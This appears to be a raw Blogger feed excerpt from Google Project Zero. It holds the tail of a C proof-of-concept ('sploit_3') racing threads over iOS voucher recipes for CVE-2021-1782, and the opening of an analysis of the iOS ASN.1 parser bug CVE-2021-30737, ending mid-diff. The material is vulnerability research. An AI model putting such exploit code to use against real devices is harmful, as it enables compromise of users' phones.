class=\"BGLtzooHlW-c2\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;single_recipe_thread&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;s3threadfunc&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;void&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;*)&amp;amp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;single_recipe_template&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; pthread_t redeem_recipe_thread&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; pthread_create&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;redeem_recipe_thread&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;s3threadfunc&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;void&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;*)&amp;amp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;redeem_recipe_template&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; pthread_join&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;single_recipe_thread&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; pthread_join&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;redeem_recipe_thread&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; free&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;single_recipe_template&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;.&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;recipe&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; free&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;redeem_recipe_template&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;.&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;recipe&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;int&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;main&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;int&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;argc&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;char&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;**&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;argv&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; sploit_3&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;();&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;"},"link":[{"@rel":"replies","@type":"application/atom+xml","@href":"https://googleprojectzero.blogspot.com/feeds/5933797027217125856/comments/default","@title":"Post Comments"},{"@rel":"replies","@type":"text/html","@href":"https://googleprojectzero.blogspot.com/2022/04/cve-2021-1782-ios-in-wild-vulnerability.html#comment-form","@title":"0 Comments"},{"@rel":"edit","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default/5933797027217125856"},{"@rel":"self","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default/5933797027217125856"},{"@rel":"alternate","@type":"text/html","@href":"https://googleprojectzero.blogspot.com/2022/04/cve-2021-1782-ios-in-wild-vulnerability.html","@title":"CVE-2021-1782, an iOS in-the-wild vulnerability in vouchers"}],"author":{"name":"Ryan","uri":"http://www.blogger.com/profile/17011901605865574886","email":"noreply@blogger.com","gd:image":{"@rel":"http://schemas.google.com/g/2005#thumbnail","@width":"16","@height":"16","@src":"https://img1.blogblog.com/img/b16-rounded.gif"}},"media:thumbnail":{"@xmlns:media":"http://search.yahoo.com/mrss/","@url":"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhTx_FjnSHTtPtnk2F1K8-AYcTnVrIBNV8PNJQgZCOhfoIvU6hD7teqA3Jmb8T8KtIpnIYKuUqa28P-pt-yM2zUsWppkcmdx18pAP8r0XTQH4JHAhpNZkC2uALpz_Pn5_OXK3mXlblNG1i6TIEtLsksgez8GlLTi2zuxP0haGXzaU1XGEj2RQeNjOto/s72-c/image1%20%283%29%281%29.png","@height":"72","@width":"72"},"thr:total":"0"},{"id":"tag:blogger.com,1999:blog-4838136820032157985.post-1033743652169779882","published":"2022-04-07T09:08:00.002-07:00","updated":"2022-08-24T12:04:12.783-07:00","title":{"@type":"text","#text":"CVE-2021-30737, @xerub's 2021 iOS ASN.1 Vulnerability"},"content":{"@type":"html","#text":"&lt;style type=\"text/css\"&gt;@import url('https://themes.googleusercontent.com/fonts/css?kit=lhDjYqiy3mZ0x6ROQEUoUw');ol{margin:0;padding:0}table td,table th{padding:0}.c5{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#e0e0e0;border-top-width:1pt;border-right-width:1pt;border-left-color:#e0e0e0;vertical-align:top;border-right-color:#e0e0e0;border-left-width:1pt;border-top-style:solid;background-color:#fafafa;border-left-style:solid;border-bottom-width:1pt;width:468pt;border-top-color:#e0e0e0;border-bottom-style:solid}.c10{color:#434343;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:14pt;font-family:\"Arial\";font-style:normal}.c2{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:10pt;font-family:Consolas,\"Courier New\";font-style:normal}.c0{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left;height:11pt}.c9{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:\"Arial\";font-style:normal}.c27{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:\"Arial\"}.c31{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:16pt;font-style:normal}.c33{padding-top:16pt;padding-bottom:4pt;line-height:1.5;page-break-after:avoid;text-align:left}.c19{color:#000000;text-decoration:none;vertical-align:baseline;font-size:11pt;font-style:normal}.c32{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;text-align:left}.c16{font-size:10pt;font-family:Consolas,\"Courier New\";color:#9c27b0;font-weight:400}.c22{font-size:10pt;font-family:Consolas,\"Courier New\";color:#0f9d58;font-weight:400}.c34{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:right}.c3{font-size:10pt;font-family:Consolas,\"Courier New\";color:#000000;font-weight:400}.c11{font-size:10pt;font-family:Consolas,\"Courier New\";color:#c53929;font-weight:400}.c1{font-size:10pt;font-family:Consolas,\"Courier New\";color:#616161;font-weight:400}.c21{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.c20{font-size:10pt;font-family:Consolas,\"Courier New\";color:#3367d6;font-weight:400}.c23{font-size:10pt;font-family:Consolas,\"Courier New\";color:#455a64;font-weight:400}.c25{border-spacing:0;border-collapse:collapse;margin-right:auto}.c6{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:left}.c13{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.c29{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;text-decoration:underline}.c30{font-weight:400;font-family:Consolas,\"Courier New\"}.c8{orphans:2;widows:2}.c24{color:inherit;text-decoration:inherit}.c7{font-weight:400;font-family:\"Courier New\"}.c4{background-color:#d9ead3}.c14{height:11pt}.c28{font-family:\"Arial\"}.c12{background-color:#f4cccc}.c18{height:0pt}.c26{font-style:italic}.c15{background-color:#ffffff}.c17{font-weight:700}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:\"Arial\"}p{margin:0;color:#000000;font-size:11pt;font-family:\"Arial\"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;/head&gt;&lt;body class=\"c13\"&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;span class=\"c9\"&gt;Posted by Ian Beer, Google Project Zero&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;span class=\"c17\"&gt;This blog post is my analysis of a vulnerability found by &lt;/span&gt;&lt;span class=\"c21 c17\"&gt;&lt;a class=\"c241\" href=\"https://twitter.com/xerub\"&gt;@xerub&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c17\"&gt;.&lt;/span&gt;&lt;span class=\"c17\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c21 c17\"&gt;&lt;a class=\"c241\" href=\"http://phrack.org/issues/70/12.html#article\"&gt;Phrack published @xerub&amp;#39;s writeup&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c19 c28 c17\"&gt;&amp;nbsp;so go check that out first.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c19 c28 c17\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;span class=\"c9\"&gt;As well as doing my own vulnerability research I also spend time trying as best as I can to keep up with the public state-of-the-art, especially when details of a particularly interesting vulnerability are announced or a new in-the-wild exploit is caught. Originally this post was just a series of notes I took last year as I was trying to understand this bug. But the bug itself and the narrative around it are so fascinating that I thought it would be worth writing up these notes into a more coherent form to share with the community.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"c32 c8\" id=\"h.s8tx0adm3791\"&gt;&lt;span&gt;Background&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;span&gt;On April 14th 2021 the &lt;/span&gt;&lt;span class=\"c21\"&gt;&lt;a class=\"c241\" href=\"https://www.washingtonpost.com/technology/2021/04/14/azimuth-san-bernardino-apple-iphone-fbi/\"&gt;Washington Post published an article&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;on the unlocking of the San Bernardino iPhone by &lt;/span&gt;&lt;span class=\"c21\"&gt;&lt;a class=\"c241\" href=\"https://www.vice.com/en/article/8xdayg/iphone-zero-days-inside-azimuth-security\"&gt;Azimuth&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;containing a nugget of non-public information:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;span&gt;&amp;quot;&lt;/span&gt;&lt;span class=\"c26\"&gt;Azimuth specialized in finding &lt;/span&gt;&lt;span class=\"c26 c29\"&gt;significant vulnerabilities&lt;/span&gt;&lt;span class=\"c26\"&gt;. Dowd [...] had found one &lt;/span&gt;&lt;span class=\"c29 c26\"&gt;in open-source code from Mozilla that Apple used&lt;/span&gt;&lt;span class=\"c26\"&gt;&amp;nbsp;to permit accessories to be plugged into&lt;/span&gt;&lt;span class=\"c26\"&gt;&amp;nbsp;an iPhone&amp;rsquo;s lightning port, according to the person.&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;quot;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;span&gt;There&amp;#39;s not that much Mozilla code running on an iPhone and even less which is likely to be part of such an attack surface. Therefore, if accurate, this quote almost certainly meant that Azimuth had exploited a vulnerability in the &lt;/span&gt;&lt;span class=\"c21\"&gt;&lt;a class=\"c241\" href=\"https://en.wikipedia.org/wiki/ASN.1\"&gt;ASN.1&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;parser used by &lt;/span&gt;&lt;span class=\"c21\"&gt;&lt;a class=\"c241\" href=\"https://opensource.apple.com/source/Security/\"&gt;Security.framework&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c9\"&gt;, which is a fork of Mozilla&amp;#39;s NSS ASN.1 parser.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;span&gt;I searched around in &lt;/span&gt;&lt;span class=\"c21\"&gt;&lt;a class=\"c241\" href=\"https://bugzilla.mozilla.org/\"&gt;bugzilla&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;(Mozilla&amp;#39;s issue tracker) looking for candidate vulnerabilities which matched the timeline discussed in the Post article and narrowed it down to a handful of plausible bugs including: &lt;/span&gt;&lt;span class=\"c21\"&gt;&lt;a class=\"c241\" href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=1202868\"&gt;1202868&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"c21\"&gt;&lt;a class=\"c241\" href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=1192028\"&gt;1192028&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"c21\"&gt;&lt;a class=\"c241\" href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=1245528\"&gt;1245528&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c9\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;span class=\"c9\"&gt;I was surprised that there had been so many exploitable-looking issues in the ASN.1 code and decided to add auditing the NSS ASN.1 parser as an quarterly goal.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;span&gt;A month later, having predictably done absolutely nothing more towards that goal, I saw this &lt;/span&gt;&lt;span class=\"c21\"&gt;&lt;a class=\"c241\" href=\"https://twitter.com/xerub/status/1397190931653222400\"&gt;tweet from @xerub&lt;/a&gt;&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;/p&gt;\n  \n &lt;p class=\"c6 c8\"&gt;&lt;span class=\"c9\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh3Zm78R4JD6H57okd_d1wpa26R9mX0Q746I5hMzwV8EMxosHbDjO5l5tH2hEpkq0m3S7AMmHOU9_6J7veCrxIxq66ilLSKJCLgHBGalgzSo0MrCulaERSbqUhXkHwqNbZdeVg4JWisV2ZuDb_j_AxLxvzX3t1EEtp396DCTt6fYeihuTRsevnnGUXD/s1188/image2%20%281%29%281%29.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh3Zm78R4JD6H57okd_d1wpa26R9mX0Q746I5hMzwV8EMxosHbDjO5l5tH2hEpkq0m3S7AMmHOU9_6J7veCrxIxq66ilLSKJCLgHBGalgzSo0MrCulaERSbqUhXkHwqNbZdeVg4JWisV2ZuDb_j_AxLxvzX3t1EEtp396DCTt6fYeihuTRsevnnGUXD/s1188/image2%20%281%29%281%29.png\" border=\"0\" alt=\"@xerub: CVE-2021-30737 is pretty bad. Please update ASAP. (Shameless excerpt from the full chain source code) 4:00 PM - May 25, 2021\" style=\"max-height: 750; max-width: 600px; \"title=\"@xerub: CVE-2021-30737 is pretty bad. Please update ASAP. (Shameless excerpt from the full chain source code) 4:00 PM - May 25, 2021\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c34 c8\"&gt;&lt;span class=\"c27 c26\"&gt;@xerub: CVE-2021-30737 is pretty bad. Please update ASAP. (Shameless excerpt from the full chain source code) 4:00 PM - May 25, 2021&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;span class=\"c9\"&gt;The shameless excerpt reads:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;span class=\"c27 c26\"&gt;// This is the real deal. Take no chances, take no prisoners! I AM THE STATE MACHINE!&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;span&gt;And CVE-2021-30737, fixed in iOS 14.6 was described in the &lt;/span&gt;&lt;span class=\"c21\"&gt;&lt;a class=\"c241\" href=\"https://support.apple.com/en-us/HT212528#:~:text=2021%2D30699%3A%20videosdebarraquito-,Security,CVE%2D2021%2D30737%3A%20xerub,-WebKit\"&gt;iOS release notes&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;as:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;/p&gt;\n  \n &lt;p class=\"c6 c8\"&gt;&lt;span&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEje1dcAUA5sK_nqVsE360buSwr8PiFgWjPgQpoq-OM0yvBR6Cb0NFXaoXwmIEE6g_fljFihcv3Vh2lUeXZJgKXfFZVC0t3-nuLvhNOx5bEriX6rZmYt1CIiRMxQ47Sw4tuyc9e7ruZC6lLPKklbsN9QQKoEE7h6QeUzQKyNk9APG5-WYvYgjCR7KRJd/s1650/image4%20%281%29%281%29.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEje1dcAUA5sK_nqVsE360buSwr8PiFgWjPgQpoq-OM0yvBR6Cb0NFXaoXwmIEE6g_fljFihcv3Vh2lUeXZJgKXfFZVC0t3-nuLvhNOx5bEriX6rZmYt1CIiRMxQ47Sw4tuyc9e7ruZC6lLPKklbsN9QQKoEE7h6QeUzQKyNk9APG5-WYvYgjCR7KRJd/s1200/image4%20%281%29%281%29.png\" border=\"0\" alt=\"Screenshot of text. Transcript: Security. Available for: iPhone 6s and later, iPad Pro (all models), iPad Air 2 and later, iPad 5th generation and later, iPad mini 4 and later, and iPod touch (7th generation). Impact: Processing a maliciously crafted certificate may lead to arbitrary code execution. Description: A memory corruption issue in the ASN.1 decoder was addressed by removing the vulnerable code. CVE-2021-30737: xerub\" style=\"max-height: 750; max-width: 600px;\" title=\"Screenshot of text. Transcript: Security. Available for: iPhone 6s and later, iPad Pro (all models), iPad Air 2 and later, iPad 5th generation and later, iPad mini 4 and later, and iPod touch (7th generation). Impact: Processing a maliciously crafted certificate may lead to arbitrary code execution. Description: A memory corruption issue in the ASN.1 decoder was addressed by removing the vulnerable code. CVE-2021-30737: xerub\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c34 c8\"&gt;&lt;span class=\"c27 c26\"&gt;Impact: Processing a maliciously crafted certification may lead to arbitrary code execution&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c34 c8\"&gt;&lt;span class=\"c27 c26\"&gt;Description: A memory corruption issue in the ASN.1 decoder was addressed by removing the vulnerable code.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;span&gt;Feeling slightly annoyed that I hadn&amp;#39;t acted on my instincts as there was clearly something awesome lurking there I made a mental note to diff the source code once Apple released it which they finally did a few weeks later on &lt;/span&gt;&lt;span class=\"c21\"&gt;&lt;a class=\"c241\" href=\"https://opensource.apple.com/source/Security/Security-59754.120.12/\"&gt;opensource.apple.com in the Security package&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c9\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;span&gt;Here&amp;#39;s the diff between the MacOS 11.4 and 11.3 versions of &lt;/span&gt;&lt;span class=\"c21\"&gt;&lt;a class=\"c241\" href=\"https://opensource.apple.com/source/Security/Security-59754.120.12/OSX/libsecurity_asn1/lib/secasn1d.c.auto.html\"&gt;secasn1d.c&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;which contains the ASN.1 parser:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.7d4e5129f2e85e500fa9ac546c708b609028d0e3\"&gt;&lt;/a&gt;&lt;a id=\"t.0\"&gt;&lt;/a&gt;&lt;table class=\"c25\"&gt;&lt;tbody&gt;&lt;tr class=\"c18\"&gt;&lt;td class=\"c5\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;diff &lt;/span&gt;&lt;span class=\"c1\"&gt;--&lt;/span&gt;&lt;span class=\"c3\"&gt;git a&lt;/span&gt;&lt;span class=\"c1\"&gt;/&lt;/span&gt;&lt;span class=\"c3\"&gt;OSX&lt;/span&gt;&lt;span class=\"c1\"&gt;/&lt;/span&gt;&lt;span class=\"c3\"&gt;libsecurity_asn1&lt;/span&gt;&lt;span class=\"c1\"&gt;/&lt;/span&gt;&lt;span class=\"c3\"&gt;lib&lt;/span&gt;&lt;span class=\"c1\"&gt;/&lt;/span&gt;&lt;span class=\"c3\"&gt;secasn1d&lt;/span&gt;&lt;span class=\"c1\"&gt;.&lt;/span&gt;&lt;span class=\"c3\"&gt;c b&lt;/span&gt;&lt;span class=\"c1\"&gt;/&lt;/span&gt;&lt;span class=\"c3\"&gt;OSX&lt;/span&gt;&lt;span class=\"c1\"&gt;/&lt;/span&gt;&lt;span class=\"c3\"&gt;libsecurity_asn1&lt;/span&gt;&lt;span class=\"c1\"&gt;/&lt;/span&gt;&lt;span class=\"c3\"&gt;lib&lt;/span&gt;&lt;span class=\"c1\"&gt;/&lt;/span&gt;&lt;span class=\"c3\"&gt;secasn1d&lt;/span&gt;&lt;span class=\"c1\"&gt;.&lt;/span&gt;&lt;span class=\"c2\"&gt;c&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;index f338527&lt;/span&gt;&lt;span class=\"c1\"&gt;..&lt;/span&gt;&lt;span 